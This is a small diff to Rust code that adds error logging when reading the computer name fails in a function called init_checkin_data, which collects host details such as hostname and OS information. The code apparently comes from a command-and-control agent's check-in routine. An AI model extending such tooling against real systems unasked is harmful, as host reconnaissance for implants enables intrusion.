@@ -1,5 +1,5 @@
 use core::ffi::c_void;
-use libc_print::libc_eprintln;
+use libc_print::{libc_eprintln, libc_println};
 use rs2_runtime::Runtime;
 
 use alloc::sync::Arc;
@@ -50,6 +50,8 @@ pub fn init_checkin_data() {
             hostname = String::from_utf16_lossy(&buffer)
                 .trim_end_matches('\0')
                 .to_string();
+        } else {
+            libc_println!("[!] get_computer_name_ex failed");
         }
 
         // Get the operating system information
